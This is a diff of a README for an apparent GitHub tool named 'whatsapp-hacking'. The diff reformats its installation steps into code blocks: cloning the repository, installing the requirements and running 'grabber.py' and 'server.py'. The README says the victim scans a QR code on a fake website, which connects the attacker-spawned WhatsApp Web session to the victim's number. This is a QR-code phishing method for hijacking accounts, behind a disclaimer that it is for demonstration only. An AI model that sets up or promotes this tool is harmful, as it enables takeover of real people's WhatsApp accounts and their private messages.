@@ -14,25 +14,26 @@ THIS IS FOR DEMONSTRATIVE PURPOSES ONLY.
 
 DO NOT USE ON REAL VICTIMS FOR ANY REASON. CRIMINAL LAW WILL APPLY.
 
-# Installation
 
+### ☑️ ***Installation***:
+```
 > pkg install python3
-
+```
+```
 > git clone https://github.com/TermuxHackz/whatsapp-hacking
-
+```
+```
 > cd whatsapp-hacking
-
-_install the requirements
-
+```
+```
 > pip install -r requirements.txt
-
-_Run the grabber 
-
-> python3 grabber.py
-
-_Run the Server
-
+```
+```
+ > python3 grabber.py
+```
+```
 > python3 server.py
+```
 
 As the victim scans the qr on the fake website, whatsapp web on the browser spawned by the grabber will be connected to the victim's number.
 
